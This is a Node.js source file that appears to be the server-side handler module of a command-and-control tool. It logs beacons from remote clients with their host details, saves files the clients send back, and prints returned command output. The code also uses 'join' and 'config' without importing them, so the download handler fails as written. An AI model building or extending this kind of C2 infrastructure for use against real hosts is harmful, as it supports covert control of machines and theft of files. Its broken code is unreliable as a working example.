const { promisify } = require('node:util');
const { mkdir, writeFile, existsSync } = require('node:fs');

const mkdir_promise = promisify(mkdir);
const writeFile_promise = promisify(writeFile);

const { log, logInfo, logError, logSuccess } = require('./logging');

/**
 * Beacon handler
 * @param {*} response 
 * @param {*} client 
 * @param {*} logStream 
 */
const handleBeacon = (response, client, logStream) => {
    logInfo(`\nReceived beacon from client: ${client.sessionId}`, logStream);
    const date = new Date();
    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
    const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
    const formattedDate = date.toLocaleDateString('en-US', dateOptions);
    const formattedTime = date.toLocaleTimeString('en-US', timeOptions);
    client.lastSeen = `${formattedDate} ${formattedTime}`;
    client.active = true;
    client.type = response.type;
    client.version = response.version;
    client.platform = response.platform;
    client.arch = response.arch; 
    client.osver = response.osver; 
    client.hostname = response.hostname;
};

/**
 * Download handler
 * @param {*} response 
 * @param {*} logStream 
 */
const handleDownloadResponse = async (response, logStream) => {
    try {
        if (!existsSync(join(__dirname, config.path.downloads))) {
            await mkdir_promise(join(__dirname, config.path.downloads));
        }
        const fileName = response.download;
        const assembledFilePath = join(join(__dirname, config.path.downloads), fileName);
        await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
        logSuccess(`\nFile "${fileName}" downloaded successfully to ${join(__dirname, config.path.downloads)}`, logStream);
    } catch (error) {
        logError(`Error handling download response: ${error.message}`, logStream);
    }
};

/**
 * Default handler
 * @param {*} response 
 * @param {*} logStream 
 * @returns 
 */
const handleResponse = (response, logStream) => {
    if (!response) {
        logError("Error: invalid response.", logStream);
        return;
    }
    // deconstruct the response response if exists;
    if (response.response) {
        response = response.response;
    }
    if (response.data) {
        let data = response.data;
        if (data.type === "Buffer") {
            // handle buffer response
            const response = Buffer.from(data.data).toString('utf8').trim();
            log(response, undefined, logStream);
            return;
        } else {
            if (typeof data !== 'string') {
                data = JSON.stringify(data);
            }
            log(data.toString('utf8').trim(), undefined, logStream);
        }
        return;
    } else if (response.message) {
        logInfo(response.message, logStream);
        return;
    } else if (response.error) {
        logError(response.error, logStream);
        return;
    }
};

module.exports = {
    handleBeacon,
    handleResponse,
    handleDownloadResponse
};